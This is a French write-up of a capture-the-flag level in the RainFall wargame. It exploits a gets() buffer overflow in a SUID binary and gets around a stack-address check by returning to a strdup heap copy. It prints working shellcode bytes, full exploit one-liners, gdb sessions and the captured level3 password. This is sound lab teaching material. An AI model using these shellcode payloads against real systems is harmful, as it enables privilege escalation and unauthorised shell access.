# LEVEL2

Le systeme de fichier se présente de cette manière:

``` diff
level2@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
+-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
```

Le fichier `level1` est un exécutable.

Le bit `SUID` est activé, l'utilisateur `level2` peut exécuter le programme avec les droits de `level3`.

En observant le code assembleur du main on peut voir un appel à la fonction `p`.

``` bash
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.
```

Voici ensuite le code assembleur de la fonciton `p`:

``` bash
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp                            # Prologue : sauvegarde l'ebp appelant
   0x080484d5 <+1>:	mov    ebp,esp                        # Nouvelle base de frame
   0x080484d7 <+3>:	sub    esp,0x68                       # Ajout de 104 octets sur la stack (espace global)
   0x080484da <+6>:	mov    eax,ds:0x8049860               # Recupère le pointeur global (stdout)
   0x080484df <+11>:	mov    DWORD PTR [esp],eax            
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>         # fflush(stdout)
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]                 # eax = adresse du buffer (ebp - 76)
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax            # esp = adresse dans eax (buffer)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>           # gets(buffer)
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]        # ebp+0x4 == adresse de retour       
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax        
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000                 
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>               # si pas dans la plage 0xb0 -> continue normalement
   0x08048507 <+51>:	mov    eax,0x8048620                  # sinon : détection, message d'erreur, exit
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>           # affiche le buffer
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>         # dupe le buffer sur la heap
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
```

En regardant le code assembleur de la fonction `p` on remarque l'appel à la fonction `gets` dont le prototype est `char *gets(char *s)`. Le man spécifie "N'utilisez jamais cette fonction", en effet, il décrit la fonction `gets()`, elle " lit une ligne depuis l'entrée standard (stdin) et la stocke dans le tampon pointé par `s` jusqu'à ce qu'elle rencontre soit un caractère de fin de ligne, soit la fin du fichier (EOF), qu'elle remplace par un octet nul (“\0”). Aucune vérification de dépassement de tampon n'est effectuée." 

On va donc pouvoir contrôler le registre d'instruction `eip` en faisant un buffer overflow.
Pour cela, on doit d'abord déterminer l'offset pour atteindre `eip`.

L'instruction à `p+19` indique que l'on met la valeur dans `ebp-0x4c` dans le registre `eax`.
Puis à `p+22` on fait pointer esp vers la valeur dans `eax`, cela permet de preparer le buffer de retour pour l'appel à la fonction `gets`. On comprend que le buffer fait `0x4c` en hexa donc 76 octets. On va donc logiquement overflow au delà de 76 octets transmis à `gets`. 

Le prologue (`push ebp`) nous indique que l'ancien `ebp` est sauvegardé juste avant l'exécution du code de `p`. Or par convention d'appel, l'adresse de retour est empilée par le call juste avant ce prologue — elle se trouve donc immédiatement au-dessus du saved ebp sur la pile, soit à `ebp+0x4`.

On va donc logiquement avoir un offset de 80 octets (76 octets du buffer et 4 octets de `ebp`) pour atteindre `eip`. Pour confirmer cet offset on construit un petit script python de 80 "A" et 4 "B" :

``` bash
level2@RainFall:~$ gdb -q level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) run < <(python2 -c 'print("A"*80 + "B"*4) ')
Starting program: /home/user/level2/level2 < <(python2 -c 'print("A"*80 + "B"*4) ')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
                                                  #eip == "BBBB"
```

On va utiliser un shellcode (recupere sur ...) afin de pouvoir lancer un shell avec le programme.
Le shellcode se presente comme cela : `\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80` (== 34 octets).
Il a pour particularite d'appeler `setreuid(getuid(), getuid())` pour conserver les droits suid du programme avant de lancer `execve("//bin/sh")`.

Le shellcode faisant 34 octets le payload de l'exploit va se presenter de maniere suivante:

`"\x90" * 46` == NOPs == no opération instructions sled
+ `shellcode`
+ adresse d'eip vers les NOPs

On identifie une adresse qui pointe vers un NOP avec gdb:
``` diff
Breakpoint 1, 0x0804853d in p ()
(gdb) x/50x $esp
0xbffff6b0:	0xbffff6cc	0x00000000	0x00000000	0xb7e5ec73
0xbffff6c0:	0x080482b5	0x00000000	0x00000000	0x90909090
0xbffff6d0:	0x90909090	0x90909090	0x90909090	0x90909090
+ 0xbffff6e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff6f0:	0x90909090	0x90909090	0x316a9090	0x80cd9958
0xbffff700:	0xc189c389	0xcd58466a	0x520bb080	0x202a2042
0xbffff710:	0x2f2f6868	0xe3896962	0x80cdd189	0x202a2042
0xbffff720:	0x08040034	0x00000000	0x00000000	0xb7e454d3
0xbffff730:	0x00000001	0xbffff7c4	0xbffff7cc	0xb7fdc858
0xbffff740:	0x00000000	0xbffff71c	0xbffff7cc	0x00000000
0xbffff750:	0x08048260	0xb7fd0ff4	0x00000000	0x00000000
0xbffff760:	0x00000000	0x54e8684a	0x63af2c5a	0x00000000
0xbffff770:	0x00000000	0x00000000
```

Mais lorsque l'on tente de réaliser l'exploit on fait face a un obstacle dans le programme :
``` bash
level2@RainFall:~$ echo $(python2 -c 'print("\x90"*46 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\xe0\xf6\xff\xbf")') | ./level2
(0xbffff6e0)
```

En effet, on rentre dans la partie à `p+51` du programme qui va écrire l'adresse de eip sur `stdout` et `exit` le programme.

``` diff
0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]        # ebp+0x4 == eip (valeur utilisée par `ret`)      
0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax        # sauvegarde dans une variable locale
0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
0x080484fb <+39>:	and    eax,0xb0000000                 
0x08048500 <+44>:	cmp    eax,0xb0000000
0x08048505 <+49>:	jne    0x8048527 <p+83>               # si pas dans la plage libc -> continue normalement
0x08048507 <+51>:	mov    eax,0x8048620                  # sinon : détection, message d'erreur, exit
0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
0x08048513 <+63>:	mov    DWORD PTR [esp],eax
+ 0x08048516 <+66>:	call   0x80483a0 <printf@plt>
0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
+ 0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
```

Cette partie du programme vérifie la valeur de `eip`, modifiée dans l'exploit précédent.
La valeur de `eip` est mise `eax` pour faire une comparaison avec `and` et `cmp`.
A `p+44` l'instruction `and eax,0xb0000000` met à 0 tous les bits où le masque vaut 0 et conserve la valeur de `eax` là où le masque vaut 1. 

Dans l'exploit précédent la valeur comparée est `bffff6e0` et `1011 1111 1111 1111 1111 0110 1110 0000` en binaire.
Seuls les 4 premiers bits (soit le premier chiffre hexadécimal) seront réellement discriminants dans la comparaison, car le masque 0xb0000000 n'a de bits à 1 que dans cet octet de poids fort (1011 0000).

Après l'instruction `and`, `eax` vaut `0xb0000000` uniquement si les bits 31, 29 et 28 de l'adresse d'origine valaient 1 (le bit 30 est annulé par le masque des deux côtés de la comparaison, donc il n'a pas d'importance).

Donc le check bloque toute adresse de retour dont l'octet de poids fort commence par `0xb` ou `0xf`.
Ce check bloque ainsi 
- les adresses de la stack de l'utilisateur (typiquement mappée autour de `0xbffff000`–`0xbfffffff`)
- les bibliothèques partagées (libc)
- toutes adresses commancant par `0xf` même si aucune zone mémoire utile de ce binaire ne s'y trouve sur ce système

On va pouvoir exploiter la heap via `strdup`, les adresses dans la heap commencant par `0x08`.
En effet, ici, `strdup()` recopie le contenu du buffer (donc le shellcode pour l'exploit) dans une nouvelle zone allouée sur la heap. Don au lieu de faire pointer l'adresse de retour vers notre shellcode sur la pile, il faut faire pointer vers la copie de ce même shellcode sur le tas, dont l'adresse passe le contrôle. On détermine cette adresse en regardant la valeur retournée par `eax` après le call au `strdup()`.

Comme l'adresse retournée par strdup() pointe exactement sur le premier octet du buffer copié, il n'est plus nécessaire de faire précéder le shellcode d'un sled de NOPs pour "viser large", l'adresse cible est connue avec précision. Le sled de NOPs a été conservé après le shellcode simplement pour conserver un padding de même taille, sans nécessité fonctionnelle.

``` bash
(gdb) run < <(python2 -c 'print("\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90" * 46 + "A" * 4)')
[...]
Breakpoint 1, 0x0804853d in p ()
(gdb) x/x $eax
0x804a008:	0x9958316a
```

La première valeur pointée par `eax` correspond bien aux premiers bytes du shelcode `\x6a\x31\x58\x99`.
On va donc faire notre exploit en rajoutant l'adresse pointant sur la heap et en ajoutant la fonction `cat()` afin de garder le bout du pipe ouvert pour l'exécution du shell.

``` bash
level2@RainFall:~$ (echo $(python2 -c 'print("\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90" * 46 + "\x08\xa0\x04\x08")'); cat) | ./level2
j1X�̀�É�jFX̀�
           Rhn/shh//bi���̀�����������������������������������������
id
uid=2022(level3) gid=2021(level2) egid=100(users) groups=2022(level3),100(users),2021(level2)
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

